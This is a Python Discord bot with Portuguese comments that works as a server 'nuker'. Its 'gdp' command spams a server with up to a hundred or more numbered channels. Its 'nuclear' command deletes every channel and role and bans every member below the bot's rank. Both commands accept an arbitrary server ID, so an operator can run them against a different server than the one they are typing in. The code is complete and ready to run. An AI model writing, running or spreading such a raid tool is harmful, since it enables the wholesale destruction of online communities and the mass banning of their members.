import discord
from discord.ext import commands
import asyncio
import os
import sys

# ==================== FUNÇÃO PARA LER O TOKEN ====================

def ler_token():
    """Tenta ler o token de múltiplas fontes"""
    
    # 1. Primeiro tenta variável de ambiente
    token = os.getenv('DISCORD_TOKEN')
    if token:
        print("✅ Token encontrado nas variáveis de ambiente")
        return token
    
    # 2. Tenta ler do arquivo .env
    try:
        if os.path.exists('.env'):
            with open('.env', 'r', encoding='utf-8') as f:
                for linha in f:
                    linha = linha.strip()
                    if linha and not linha.startswith('#'):
                        if 'DISCORD_TOKEN' in linha:
                            # Formato: DISCORD_TOKEN=valor
                            partes = linha.split('=', 1)
                            if len(partes) == 2:
                                token = partes[1].strip().strip('"').strip("'")
                                print("✅ Token encontrado no arquivo .env")
                                return token
    except Exception as e:
        print(f"⚠️ Erro ao ler .env: {e}")
    
    # 3. Se não achou, mostra erro detalhado
    print("=" * 60)
    print("❌ ERRO CRÍTICO: DISCORD_TOKEN não encontrado!")
    print("=" * 60)
    
    return None

# ==================== CONFIGURAÇÃO ====================

# Ler o token
TOKEN = ler_token()

# Se não encontrou, encerra
if TOKEN is None:
    sys.exit(1)

print(f"🔑 Token carregado: {TOKEN[:10]}... (tamanho: {len(TOKEN)})")

# Intents do Discord
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

# Inicializar bot
bot = commands.Bot(command_prefix='!', intents=intents)

# ==================== COMANDOS ====================

@bot.event
async def on_ready():
    print(f"✅ Bot online: {bot.user}")
    print(f"📡 Servidores conectados: {len(bot.guilds)}")
    print("=" * 40)
    for guild in bot.guilds:
        print(f"   • {guild.name} (ID: {guild.id})")
    print("=" * 40)

@bot.command(name='gdp')
@commands.has_permissions(administrator=True)
async def gdp(ctx, quantidade: int = 100, server_id: str = None):
    """Cria canais G.D.P no servidor"""
    
    # Determinar servidor alvo
    target_guild = ctx.guild
    if server_id:
        try:
            target_guild = bot.get_guild(int(server_id))
            if not target_guild:
                await ctx.send(f"❌ Servidor {server_id} não encontrado")
                return
        except ValueError:
            await ctx.send("❌ ID do servidor inválido")
            return
    
    # Verificar permissões
    if not target_guild.me.guild_permissions.manage_channels:
        await ctx.send("❌ Bot não tem permissão para criar canais")
        return
    
    await ctx.send(f"📝 Criando {quantidade} canais em {target_guild.name}...")
    
    criados = 0
    for i in range(1, quantidade + 1):
        try:
            nome = f"G.D.P-{i:03d}"
            await target_guild.create_text_channel(nome)
            criados += 1
            
            if i % 10 == 0:
                await ctx.send(f"📊 Progresso: {i}/{quantidade}")
            
            await asyncio.sleep(0.5)
        except Exception as e:
            await ctx.send(f"❌ Erro: {e}")
            break
    
    await ctx.send(f"✅ {criados} canais criados com sucesso!")

@bot.command(name='nuclear')
@commands.has_permissions(administrator=True)
async def nuclear(ctx, server_id: str = None):
    """Limpeza nuclear do servidor"""
    
    # Determinar servidor alvo
    target_guild = ctx.guild
    if server_id:
        try:
            target_guild = bot.get_guild(int(server_id))
            if not target_guild:
                await ctx.send(f"❌ Servidor {server_id} não encontrado")
                return
        except ValueError:
            await ctx.send("❌ ID do servidor inválido")
            return
    
    # Verificar permissões
    if not target_guild.me.guild_permissions.administrator:
        await ctx.send("❌ Bot precisa ser administrador")
        return
    
    # Mensagem de confirmação
    await ctx.send("☢️ **CONFIRMAÇÃO NUCLEAR**\nDigite `CONFIRMAR` para prosseguir:")
    
    def check(m):
        return m.author == ctx.author and m.content == "CONFIRMAR"
    
    try:
        await bot.wait_for('message', timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("❌ Tempo esgotado")
        return
    
    await ctx.send("☢️ **INICIANDO LIMPEZA NUCLEAR**...")
    
    # Deletar canais
    canais_deletados = 0
    for channel in target_guild.channels:
        try:
            await channel.delete()
            canais_deletados += 1
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Deletar cargos
    cargos_deletados = 0
    for role in target_guild.roles:
        if role.name != "@everyone" and not role.managed and role < target_guild.me.top_role:
            try:
                await role.delete()
                cargos_deletados += 1
                await asyncio.sleep(0.3)
            except:
                pass
    
    # Banir membros
    membros_banidos = 0
    for member in target_guild.members:
        if member != target_guild.me and member.top_role < target_guild.me.top_role:
            try:
                await member.ban(reason="Nuclear - Limpeza total")
                membros_banidos += 1
                await asyncio.sleep(1)
            except:
                pass
    
    # Resultado final
    embed = discord.Embed(
        title="☢️ **NUCLEAR CONCLUÍDO**",
        color=0xff0000
    )
    embed.add_field(name="Canais deletados", value=f"```{canais_deletados}```", inline=True)
    embed.add_field(name="Cargos deletados", value=f"```{cargos_deletados}```", inline=True)
    embed.add_field(name="Membros banidos", value=f"```{membros_banidos}```", inline=True)
    
    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Você precisa ser administrador para usar este comando")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ Erro: {error}")

# ==================== INICIAR BOT ====================

if __name__ == "__main__":
    print("🚀 Iniciando bot Zxy-panda...")
    bot.run(TOKEN)